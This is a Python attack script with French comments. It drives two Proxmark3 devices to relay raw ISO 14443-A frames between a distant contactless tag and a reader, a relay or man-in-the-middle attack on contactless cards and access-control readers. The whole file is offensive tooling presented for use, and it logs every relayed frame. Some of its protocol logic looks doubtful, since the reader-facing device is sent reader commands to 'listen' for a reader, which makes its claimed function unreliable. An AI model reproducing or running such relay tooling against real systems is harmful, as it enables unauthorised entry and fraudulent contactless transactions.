#!/usr/bin/env python3
import serial
import struct
import time

# --- Constantes Low-Level ---
CMD_HF_ISO14443A_READER = 0x0385
COMMANDNG_PREAMBLE_MAGIC = 0x61334d50
RESPONSENG_PREAMBLE_MAGIC = 0x62334d50

# Flags pour forcer le mode RAW pur
# RAW (bit 3) + NO_DISCONNECT (bit 1) + SNOOP (bit 6)
RAW_FLAGS = (1 << 3) | (1 << 1) | (1 << 6)

class TrueRawMitM:
    def __init__(self, mole_port='/dev/ttyACM1', proxy_port='/dev/ttyACM0'):
        self.mole = serial.Serial(mole_port, 115200, timeout=0.001)
        self.proxy = serial.Serial(proxy_port, 115200, timeout=0.001)

    def _build_pkt(self, cmd, data, flags=0):
        # Formatage du payload MIX (Args + Data)
        payload = struct.pack('<QQQ', flags, len(data), 0) + data
        length_ng = len(payload) & 0x7FFF
        pkt = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
        pkt += payload + struct.pack('<H', 0x3361)
        return pkt

    def _read_frame(self, ser):
        if ser.in_waiting < 10: return None
        head = ser.read(10)
        magic, length_ng, cmd, status, reason = struct.unpack('<IHHBB', head)
        if magic != RESPONSENG_PREAMBLE_MAGIC: return None
        length = length_ng & 0x7FFF
        payload = ser.read(length)
        ser.read(2) # postamble
        return payload[24:] if len(payload) > 24 else None

    def run(self):
        print("[!] MODE RAW ACTIF - Transit intégral des bits")
        
        # On place les deux PM3 en mode écoute RAW
        # La Mole attend le tag, le Proxy attend le lecteur
        print("[*] Proxy en attente du champ du lecteur...")
        
        try:
            while True:
                # 1. ÉCOUTE DU LECTEUR (Proxy)
                # On envoie une commande vide pour "poll" le champ
                self.proxy.write(self._build_pkt(CMD_HF_ISO14443A_READER, b'', RAW_FLAGS))
                reader_bits = self._read_frame(self.proxy)

                if reader_bits:
                    print(f"\n[RAW] LECTEUR >> {reader_bits.hex()}")
                    
                    # 2. TRANSIT VERS LE TAG (Mole)
                    self.mole.write(self._build_pkt(CMD_HF_ISO14443A_READER, reader_bits, RAW_FLAGS))
                    
                    # 3. RÉPONSE DU TAG
                    tag_bits = None
                    # Petit timeout pour laisser le tag répondre
                    for _ in range(10):
                        tag_bits = self._read_frame(self.mole)
                        if tag_bits: break
                        time.sleep(0.001)

                    if tag_bits:
                        print(f"[RAW] TAG     << {tag_bits.hex()}")
                        
                        # 4. RETOUR AU LECTEUR (Proxy)
                        self.proxy.write(self._build_pkt(CMD_HF_ISO14443A_READER, tag_bits, RAW_FLAGS))
                    else:
                        print("[RAW] TAG     << (Silence)")

        except KeyboardInterrupt:
            print("\nArrêt.")

if __name__ == "__main__":
    mitm = TrueRawMitM()
    mitm.run()